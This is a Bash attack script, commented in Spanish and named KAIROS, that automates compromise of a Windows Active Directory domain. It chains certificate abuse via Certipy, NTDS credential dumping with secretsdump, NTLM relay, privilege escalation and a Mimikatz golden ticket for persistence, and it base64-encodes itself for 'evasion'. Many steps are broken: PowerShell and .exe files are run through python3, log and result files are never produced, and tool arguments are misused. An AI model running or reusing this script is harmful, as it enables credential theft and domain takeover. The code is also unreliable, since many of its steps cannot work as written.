#!/bin/bash
set -o pipefail

### KAIROS ###
# Script avanzado de pentesting para Active Directory, con automatización inteligente
# en escalada de privilegios, administración de certificados y técnicas de persistencia.

### Ejemplo de Uso ###
# ./kairos.sh -d DOMAIN -u USER -p PASS -c CERT_PATH -a ADCS_IP -i DC_IP -o NTDS_DUMP_PATH

### Variables Globales ###
DOMAIN=""
USER=""
PASS=""
IP_ADCS=""
IP_DC=""
CERT_PATH=""
NTDS_DUMP_PATH=""
TGT_FILE="tgt.txt"
LOG_FILE="rubeus.log"
OBFUSCATED_SCRIPT="obfuscated_script.sh"

### Opciones de Argumentos ###
usage() {
    printf "Uso: %s -d DOMAIN -u USER -p PASS -c CERT_PATH -a ADCS_IP -i DC_IP -o NTDS_DUMP_PATH\n" "$0"
    exit 1
}

parse_args() {
    while getopts ":d:u:p:c:a:i:o:" opt; do
        case "${opt}" in
            d) DOMAIN="$OPTARG" ;;
            u) USER="$OPTARG" ;;
            p) PASS="$OPTARG" ;;
            c) CERT_PATH="$OPTARG" ;;
            a) IP_ADCS="$OPTARG" ;;
            i) IP_DC="$OPTARG" ;;
            o) NTDS_DUMP_PATH="$OPTARG" ;;
            *) usage ;;
        esac
    done
    if [[ -z $DOMAIN || -z $USER || -z $PASS || -z $CERT_PATH || -z $IP_ADCS || -z $IP_DC || -z $NTDS_DUMP_PATH ]]; then
        usage
    fi
}

### Función: Convertir el certificado PFX a PEM ###

convert_pfx_to_pem() {
    if ! openssl pkcs12 -in "$CERT_PATH" -nodes -out certificate.pem; then
        printf "Error: No se pudo convertir el certificado PFX a PEM\n" >&2
        return 1
    fi
    printf "Certificado convertido exitosamente a formato PEM\n"
}

### Función: Detección de Vulnerabilidades en ADCS ###

detect_adcs_misconfig() {
    if ! python3 /path/Certipy/Certipy.py find -d "$DOMAIN" -dc-ip "$IP_ADCS"; then
        printf "Error: No se pudo detectar configuraciones inseguras en ADCS\n" >&2
        return 1
    fi
    printf "Detección de configuraciones inseguras en ADCS completada\n"
}

### Función: Solicitar TGT usando Certipy ###

request_tgt() {
    if ! python3 /path/Certipy/Certipy.py tgt -u "$USER" -p "$PASS" -d "$DOMAIN" -k -dc-ip "$IP_DC" > "$LOG_FILE"; then
        printf "Error: Falló la solicitud del ticket TGT con Certipy\n" >&2
        return 1
    fi
    printf "Ticket TGT solicitado exitosamente\n"
}

### Función: Extraer el TGT de la salida de Rubeus ###

extract_tgt() {
    if ! grep "TGT:" "$LOG_FILE" > "$TGT_FILE"; then
        printf "Error: No se pudo extraer el TGT del log\n" >&2
        return 1
    fi
    printf "TGT extraído exitosamente\n"
}

### Función: Autenticarse usando TGT ###

authenticate_with_tgt() {
    if ! python3 /path/impacket/examples/secretsdump.py -k -outputfile "$NTDS_DUMP_PATH" "$DOMAIN"/"$USER"@"$IP_DC" -no-pass -dc-ip "$IP_DC"; then
        printf "Error: Falló la autenticación con TGT\n" >&2
        return 1
    fi
    printf "Autenticación con TGT realizada con éxito\n"
}

### Función: Enumerar ACLs para encontrar rutas de privilegio ###

enumerate_acls() {
    if ! python3 /path/SharpHound/SharpHound.py -c All -d "$DOMAIN" -dc-ip "$IP_DC"; then
        printf "Error: Falló la enumeración de ACLs\n" >&2
        return 1
    fi
    printf "Enumeración de ACLs completada con éxito\n"
}

### Función: Escalada de Privilegios Basada en Resultados ###

escalate_privileges() {
    # Detectar permisos WriteDACL en cuentas de servicio
    if grep -q "WriteDACL" acl_enum_result.txt; then
        printf "Permiso WriteDACL encontrado, intentando escalada de privilegios\n"
        if ! python3 /path/PowerUp.ps1 -Command "Invoke-AllChecks"; then
            printf "Error: Falló la escalada de privilegios\n" >&2
            return 1
        fi
        printf "Escalada de privilegios realizada con éxito\n"
    else
        printf "No se encontraron permisos excesivos para escalada\n"
    fi
}

### Función: Ejecutar NTLM Relay ###

ntlm_relay() {
    printf "Verificando dispositivos vulnerables para NTLM Relay\n"
    if nmap -p 445 --open "$DOMAIN" | grep -q "open"; then
        printf "Dispositivos vulnerables encontrados, iniciando ataque NTLM Relay\n"
        if ! ntlmrelayx -tf "$NTDS_DUMP_PATH" -smb2support -debug; then
            printf "Error: Falló el ataque de NTLM Relay\n" >&2
            return 1
        fi
        printf "NTLM Relay ejecutado con éxito\n"
    else
        printf "No se encontraron dispositivos vulnerables para NTLM Relay\n"
    fi
}

### Función: Realizar volcado del NTDS ###

dump_ntds() {
    if ! python3 /path/impacket/examples/secretsdump.py -just-dc-user "$USER" -outputfile "$NTDS_DUMP_PATH" "$DOMAIN"/"$USER"@"$IP_DC" -no-pass -dc-ip "$IP_DC"; then
        printf "Error: Falló el volcado de NTDS\n" >&2
        return 1
    fi
    printf "Volcado de NTDS realizado con éxito\n"
}

### Función: Persistencia y Evasión ###

persist_and_evasion() {
    printf "Aplicando técnicas de persistencia y evasión\n"
    if ! python3 /path/Mimikatz/mimikatz.exe "kerberos::golden /user:$USER /domain:$DOMAIN /sid:S-1-5-21-..." > golden_ticket.kirbi; then
        printf "Error: Falló la generación de Golden Ticket\n" >&2
        return 1
    fi
    printf "Golden Ticket creado para persistencia\n"
}

### Función: Ofuscación del Script ###

obfuscate_script() {
    printf "Ofuscando el script para evitar detección\n"
    base64 < "$0" > "$OBFUSCATED_SCRIPT"
    printf "Script ofuscado creado en $OBFUSCATED_SCRIPT\n"
}

### Ejecución Principal ###

main() {
    parse_args "$@"
    convert_pfx_to_pem || exit 1
    detect_adcs_misconfig || exit 1
    request_tgt || exit 1
    extract_tgt || exit 1
    authenticate_with_tgt || exit 1
    enumerate_acls || exit 1
    escalate_privileges || exit 1
    ntlm_relay || exit 1
    dump_ntds || exit 1
    persist_and_evasion || exit 1
    obfuscate_script || exit 1
}

main "$@"
